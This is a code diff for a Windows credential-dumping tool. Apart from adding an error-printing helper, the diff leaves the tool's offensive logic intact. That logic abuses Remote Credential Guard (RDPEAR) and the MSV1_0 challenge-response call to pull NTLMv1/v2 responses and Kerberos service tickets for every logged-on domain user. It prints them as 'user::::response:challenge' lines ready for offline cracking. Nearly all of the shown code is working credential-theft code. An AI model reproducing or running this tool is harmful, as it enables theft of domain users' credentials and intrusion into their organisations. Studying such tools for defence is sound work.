@@ -78,6 +78,30 @@ void __RPC_USER MIDL_user_free(_Pre_maybenull_ _Post_invalid_ void* p)
 	LocalFree(p);
 }
 
+BOOL print_error(LPCSTR function, NTSTATUS status)
+{
+	LPWSTR message = NULL;
+	NTSTATUS error = status;
+
+	for (int i = 0; i < 2; i++)
+	{
+		DWORD message_length = FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_MAX_WIDTH_MASK,
+			NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&message, 0, NULL);
+
+		if (message != NULL && message_length != 0)
+		{
+			printf("[-] %s failed with error 0x%08x: %S\n", function, status, message);
+			LocalFree(message);
+			return TRUE;
+		}
+
+		error = RtlNtStatusToDosError(error);
+	}
+
+	printf("[-] %s failed with unknown error: 0x%08x\n", function, status);
+	return FALSE;
+}
+
 BOOL is_domain_sid(PSID sid)
 {
 	if (!IsValidSid(sid))
@@ -331,7 +355,7 @@ BOOL parse_arguments(int argc, char* argv[], DG_ARGUMENTS* args)
 
 BOOL perform_rcg_dump_self(DG_ARGUMENTS* args)
 {
-	BOOL result = FALSE;
+	NTSTATUS status = 0;
 
 	TSSSP_CLIENT_CONTEXT client_context;
 	tsssp_client_init_context(&client_context);
@@ -339,8 +363,8 @@ BOOL perform_rcg_dump_self(DG_ARGUMENTS* args)
 	TSSSP_SERVER_CONTEXT server_context;
 	tsssp_server_init_context(&server_context, args->rcg_domain, args->rcg_username, args->rcg_password);
 
-	if (!tsssp_client_acquire_credentials(&client_context))
-		puts("[-] Failed to acquire client credentials handle");
+	if (!NT_SUCCESS(status = tsssp_client_acquire_credentials(&client_context)))
+		print_error("AcquireCredentialsHandle", status);
 	else
 	{
 		SecBuffer output_buffers[1] = { 0, SECBUFFER_TOKEN, NULL };
@@ -360,8 +384,7 @@ BOOL perform_rcg_dump_self(DG_ARGUMENTS* args)
 				output_buffers[0].pvBuffer = NULL;
 				output_buffers[0].cbBuffer = 0;
 
-				if (!tsssp_client_initialize_security_context(&client_context, args->rcg_spn, &input_desc, &output_desc))
-					break;
+				status = tsssp_client_initialize_security_context(&client_context, args->rcg_spn, &input_desc, &output_desc);
 
 				if (input_buffers[0].pvBuffer != NULL)
 				{
@@ -370,6 +393,12 @@ BOOL perform_rcg_dump_self(DG_ARGUMENTS* args)
 				}
 
 				input_buffers[0].cbBuffer = 0;
+
+				if (!NT_SUCCESS(status))
+				{
+					print_error("InitializeSecurityContext", status);
+					break;
+				}
 			}
 
 			if (!server_context.authenticated)
@@ -377,12 +406,11 @@ BOOL perform_rcg_dump_self(DG_ARGUMENTS* args)
 				ULONG cbResponse = 0;
 				PVOID pvResponse = NULL;
 
-				if (!tsssp_server_accept_security_context(&server_context, output_buffers[0].pvBuffer, output_buffers[0].cbBuffer,
-					&RcgTest_SelfSignedCert[4], sizeof(RcgTest_SelfSignedCert) - 4, &pvResponse, &cbResponse))
-				{
-					input_buffers[0].pvBuffer = pvResponse;
-					input_buffers[0].cbBuffer = cbResponse;
-				}
+				BOOL result = tsssp_server_accept_security_context(&server_context, output_buffers[0].pvBuffer, output_buffers[0].cbBuffer,
+					&RcgTest_SelfSignedCert[4], sizeof(RcgTest_SelfSignedCert) - 4, &pvResponse, &cbResponse);
+
+				input_buffers[0].pvBuffer = pvResponse;
+				input_buffers[0].cbBuffer = cbResponse;
 
 				if (output_buffers[0].pvBuffer != NULL)
 				{
@@ -391,24 +419,27 @@ BOOL perform_rcg_dump_self(DG_ARGUMENTS* args)
 				}
 
 				output_buffers[0].cbBuffer = 0;
+
+				if (!result)
+					break;
 			}
 		}
 
 		if (client_context.authenticated && server_context.authenticated)
 		{
 			if (args->command == dg_comm_ntlmv1)
-				result = tsssp_rdpear_send_ntlm_request_v1(&server_context, &client_context);
+				tsssp_rdpear_send_ntlm_request_v1(&server_context, &client_context);
 			else if (args->command == dg_comm_ntlmv2)
-				result = tsssp_rdpear_send_ntlm_request_v2(&server_context, &client_context);
+				tsssp_rdpear_send_ntlm_request_v2(&server_context, &client_context);
 			else if (args->command == dg_comm_kerb_tgs)
-				result = tsssp_rdpear_send_kerb_request_service_ticket(&server_context, &client_context, args->kerb_domain, args->kerb_spn);
+				tsssp_rdpear_send_kerb_request_service_ticket(&server_context, &client_context, args->kerb_domain, args->kerb_spn);
 		}
 	}
 
 	tsssp_server_free_context(&server_context);
 	tsssp_client_free_context(&client_context);
 
-	return result;
+	return (status == 0);
 }
 
 BOOL perform_rcg_dump_all(DG_ARGUMENTS* args)
@@ -496,7 +527,7 @@ BOOL perform_rcg_dump_all(DG_ARGUMENTS* args)
 
 BOOL perform_msv1_0_dump()
 {
-	BOOL result = FALSE;
+	NTSTATUS status = 0;
 
 	PSID existing_sids[1024];
 	DWORD existing_sid_count = 0;
@@ -504,13 +535,17 @@ BOOL perform_msv1_0_dump()
 	ULONG session_count = 0;
 	PLUID session_list = NULL;
 
-	if (NT_SUCCESS(LsaEnumerateLogonSessions(&session_count, &session_list)))
+	if (!NT_SUCCESS(status = LsaEnumerateLogonSessions(&session_count, &session_list)))
+		print_error("LsaEnumerateLogonSessions", status);
+	else
 	{
 		for (ULONG i = 0; i < session_count; i++)
 		{
 			SECURITY_LOGON_SESSION_DATA* session_data = NULL;
 
-			if (NT_SUCCESS(LsaGetLogonSessionData(&session_list[i], &session_data)))
+			if (!NT_SUCCESS(status = LsaGetLogonSessionData(&session_list[i], &session_data)))
+				print_error("LsaGetLogonSessionData", status);
+			else
 			{
 				if (is_domain_sid(session_data->Sid) && !is_existing_sid(session_data->Sid, existing_sids, existing_sid_count))
 				{
@@ -524,7 +559,9 @@ BOOL perform_msv1_0_dump()
 
 					HANDLE lsa_handle = NULL;
 
-					if (NT_SUCCESS(LsaConnectUntrusted(&lsa_handle)))
+					if (!NT_SUCCESS(status = LsaConnectUntrusted(&lsa_handle)))
+						print_error("LsaConnectUntrusted", status);
+					else
 					{
 						LSA_STRING package_name;
 						memset(&package_name, 0, sizeof(package_name));
@@ -535,7 +572,9 @@ BOOL perform_msv1_0_dump()
 
 						ULONG package_id = 0;
 
-						if (NT_SUCCESS(LsaLookupAuthenticationPackage(lsa_handle, &package_name, &package_id)))
+						if (!NT_SUCCESS(status = LsaLookupAuthenticationPackage(lsa_handle, &package_name, &package_id)))
+							print_error("LsaLookupAuthenticationPackage", status);
+						else
 						{
 							MSV1_0_GETCHALLENRESP_REQUEST request;
 							memset(&request, 0, sizeof(request));
@@ -551,57 +590,41 @@ BOOL perform_msv1_0_dump()
 
 							NTSTATUS protocol_status = 0;
 
-							if (NT_SUCCESS(LsaCallAuthenticationPackage(lsa_handle, package_id, &request, sizeof(request), &pvOutput, &cbOutput, &protocol_status)))
+							if (!NT_SUCCESS(status = LsaCallAuthenticationPackage(lsa_handle, package_id, &request, sizeof(request), &pvOutput, &cbOutput, &protocol_status)))
+								print_error("LsaCallAuthenticationPackage", status);
+							else if (!NT_SUCCESS(protocol_status))
+								print_error("LsaCallAuthenticationPackage", protocol_status);
+							else if (pvOutput != NULL)
 							{
-								if (!NT_SUCCESS(protocol_status))
+								MSV1_0_GETCHALLENRESP_RESPONSE* response = (MSV1_0_GETCHALLENRESP_RESPONSE*)pvOutput;
+
+								if (cbOutput >= sizeof(MSV1_0_GETCHALLENRESP_RESPONSE))
 								{
-									LPSTR message = NULL;
-									DWORD message_length = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, protocol_status, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&message, 0, NULL);
+									printf("%.*S::::", (int)(session_data->UserName.Length / sizeof(wchar_t)), session_data->UserName.Buffer);
 
-									if (message != NULL && message_length != 0)
+									if (response->CaseSensitiveChallengeResponse.Length >= 24)
 									{
-										printf("Failed with error: 0x%08x (%s)\n", protocol_status, message);
-										LocalFree(message);
+										for (int i = 0; i < response->CaseSensitiveChallengeResponse.Length; i++)
+											printf("%02x", (BYTE)response->CaseSensitiveChallengeResponse.Buffer[i]);
 									}
-									else
+									else if (response->CaseInsensitiveChallengeResponse.Length >= 24)
 									{
-										printf("Failed with unknown error: 0x%08x\n", protocol_status);
+										for (int i = 0; i < response->CaseInsensitiveChallengeResponse.Length; i++)
+											printf("%02x", (BYTE)response->CaseInsensitiveChallengeResponse.Buffer[i]);
 									}
+
+									printf(":");
+
+									for (int i = 0; i < sizeof(request.ChallengeToClient); i++)
+										printf("%02x", request.ChallengeToClient[i]);
+
+									printf("\n");
+
+									if (existing_sid_count < _countof(existing_sids))
+										add_existing_sid(session_data->Sid, existing_sids, &existing_sid_count);
 								}
-								else if (pvOutput != NULL)
-								{
-									MSV1_0_GETCHALLENRESP_RESPONSE* response = (MSV1_0_GETCHALLENRESP_RESPONSE*)pvOutput;
 
-									if (cbOutput >= sizeof(MSV1_0_GETCHALLENRESP_RESPONSE))
-									{
-										printf("%.*S::::", (int)(session_data->UserName.Length / sizeof(wchar_t)), session_data->UserName.Buffer);
-
-										if (response->CaseSensitiveChallengeResponse.Length >= 24)
-										{
-											for (int i = 0; i < response->CaseSensitiveChallengeResponse.Length; i++)
-												printf("%02x", (BYTE)response->CaseSensitiveChallengeResponse.Buffer[i]);
-										}
-										else if (response->CaseInsensitiveChallengeResponse.Length >= 24)
-										{
-											for (int i = 0; i < response->CaseInsensitiveChallengeResponse.Length; i++)
-												printf("%02x", (BYTE)response->CaseInsensitiveChallengeResponse.Buffer[i]);
-										}
-
-										printf(":");
-
-										for (int i = 0; i < sizeof(request.ChallengeToClient); i++)
-											printf("%02x", request.ChallengeToClient[i]);
-
-										printf("\n");
-
-										result = TRUE;
-
-										if (existing_sid_count < _countof(existing_sids))
-											add_existing_sid(session_data->Sid, existing_sids, &existing_sid_count);
-									}
-
-									LsaFreeReturnBuffer(pvOutput);
-								}
+								LsaFreeReturnBuffer(pvOutput);
 							}
 						}
 
@@ -617,7 +640,7 @@ BOOL perform_msv1_0_dump()
 	}
 
 	free_existing_sids(existing_sids, existing_sid_count);
-	return result;
+	return (status == 0);
 }
 
 int main(int argc, char* argv[])
